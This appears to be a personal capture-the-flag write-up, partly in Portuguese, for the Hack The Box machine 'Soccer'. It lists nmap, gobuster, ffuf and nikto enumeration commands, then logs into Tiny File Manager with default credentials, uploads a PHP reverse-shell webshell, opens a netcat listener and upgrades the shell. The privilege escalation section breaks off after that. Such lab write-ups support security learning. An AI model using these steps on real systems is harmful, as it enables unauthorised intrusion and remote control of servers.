Soccer
========================

## Enumeration

    sudo nmap_enum soccer.htb | tee nmap_output.txt
    
![qownnotes-media-EFydPK](../../../media/qownnotes-media-EFydPK.png)

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn soccer.htb | tee nmap_udp_output.txt
 
![qownnotes-media-moHZYU](../../../media/qownnotes-media-moHZYU.png)

    sudo nmap -p- -Pn -T5 -n soccer.htb | tee nmap_fullportstcp_output.txt
 
 ![qownnotes-media-hsIxUG](../../../media/qownnotes-media-hsIxUG.png)

    sudo nmap -sS --script vuln -n -T5 -Pn soccer.htb -p 22,80,9091 | tee nmap_vulns.txt

![qownnotes-media-VMsHoN](../../../media/qownnotes-media-VMsHoN.png)


    gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -t 16 -o "tcp_port_protocol_s_ext_gobuster.txt"

![qownnotes-media-IOqLMK](../../../media/qownnotes-media-IOqLMK.png)

    ffuf -c -ic -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.soccer.htb" -u http://soccer.htb -fs 178
    
 ![qownnotes-media-jcGCIp](../../../media/qownnotes-media-jcGCIp.png)


    gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_ext_gobuster.txt"
    
![qownnotes-media-urCTvu](../../../media/qownnotes-media-urCTvu.png)

    nikto -host http://soccer.htb -T x 6 | tee nikto_output.txt

![qownnotes-media-aQsSch](../../../media/qownnotes-media-aQsSch.png)


    searchsploit OpenSSH 8.2p1

![qownnotes-media-rvuSkW](../../../media/qownnotes-media-rvuSkW.png)

    httrack http://soccer.htb/
    cat hts-cache/new.txt | cut -f 8

![qownnotes-media-SrwVeB](../../../media/qownnotes-media-SrwVeB.png)

    gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_gobuster.txt"

![qownnotes-media-NWqyRO](../../../media/qownnotes-media-NWqyRO.png)

![qownnotes-media-ywpCxp](../../../media/qownnotes-media-ywpCxp.png)

## Exploitation

    searchsploit tiny file manager
    
![qownnotes-media-dukuga](../../../media/qownnotes-media-dukuga.png)


    cp /usr/share/exploitdb/exploits/php/webapps/50828.sh exploit.sh
    chmod +x exploit.sh
 
 Depois de alterar de diveresas formas o exploit, notei que a eexploração seria mais fácil na mão mesmo. Sendo assim, entrei no portal com as credenciais:
 
     admin
     admin@123

entrei nas pastas e finalmente achei um caminho que deeixava eu fazer o upload. Depois eu utilizei desta shell aqui para conseguir uma shell reversa:

    /usr/share/webshells/php/php-reverse-shell.php

    cp /usr/share/webshells/php/php-reverse-shell.php webshell.php
    firefox http://soccer.htb/tiny/uploads/webshell.php
    
    nc -nlvp 8082

![qownnotes-media-lAtUto](../../../media/qownnotes-media-lAtUto.png)

## PrivEsc

    python3 -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
<Ctrl + Z>

    stty raw -echo; fg
    reset

